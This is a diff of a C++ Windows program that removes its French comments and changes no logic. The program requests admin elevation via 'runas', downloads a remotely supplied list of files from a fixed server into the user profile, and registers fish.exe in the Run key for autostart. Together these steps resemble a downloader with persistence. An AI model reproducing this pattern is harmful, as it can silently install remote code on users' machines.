@@ -1,22 +1,21 @@
 #include <windows.h>
-#include <shlobj.h>  // SHGetFolderPath
-#include <wininet.h> // Téléchargement HTTP
+#include <shlobj.h>
+#include <wininet.h>
 #include <string>
 #include <vector>
 #include <fstream>
 #include <iostream>
 
 #pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "advapi32.lib") // Pour créer le service
+#pragma comment(lib, "advapi32.lib")
 
 using namespace std;
 
 const string SERVER_URL = "https://arthur.xn--pruvost-rivire-6jb.fr/cdn/";
-const string FILE_LIST = "files.txt"; // Fichier contenant la liste des fichiers à télécharger
+const string FILE_LIST = "files.txt";
 
 
 void RequestAdminPrivileges() {
-    // Vérifie si le programme tourne déjà en mode admin
     BOOL isAdmin = FALSE;
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
     PSID pAdminGroup;
@@ -32,7 +31,7 @@ void RequestAdminPrivileges() {
         GetModuleFileName(NULL, szPath, MAX_PATH);
 
         SHELLEXECUTEINFO sei = { sizeof(sei) };
-        sei.lpVerb = TEXT("runas");  // Demande les droits administrateur
+        sei.lpVerb = TEXT("runas");
         sei.lpFile = szPath;
         sei.hwnd = NULL;
         sei.nShow = SW_SHOWDEFAULT;
@@ -139,13 +138,10 @@ void AddToStartup() {
     const char* appName = "fish";
     char szPath[MAX_PATH];
 
-    // Récupère la variable d'environnement %USERPROFILE%
     if (GetEnvironmentVariableA("USERPROFILE", szPath, MAX_PATH)) {
-        strcat_s(szPath, "\\fish\\fish.exe");  // Construit le chemin complet
+        strcat_s(szPath, "\\fish\\fish.exe");
 
-        // Ouvre la clé de registre pour modification
         if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            // Ajoute ou met à jour l'entrée
             RegSetValueExA(hKey, appName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
             RegCloseKey(hKey);
         }
@@ -178,17 +174,17 @@ int main() {
     string fishFolder = userFolder + "\\fish";
     CreateDirectory(fishFolder.c_str(), NULL);
 
-    // Télécharger la liste des fichiers
+
     string fileListPath = fishFolder + "\\" + FILE_LIST;
     if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
         MessageBox(NULL, "Échec du téléchargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
         return 1;
     }
 
-    // Lire la liste des fichiers
+
     vector<string> filesToDownload = GetFileList(fileListPath);
 
-    // Télécharger chaque fichier listé
+
     for (const string& file : filesToDownload) {
         string url = SERVER_URL + file;
         string localPath = fishFolder + "\\" + file;
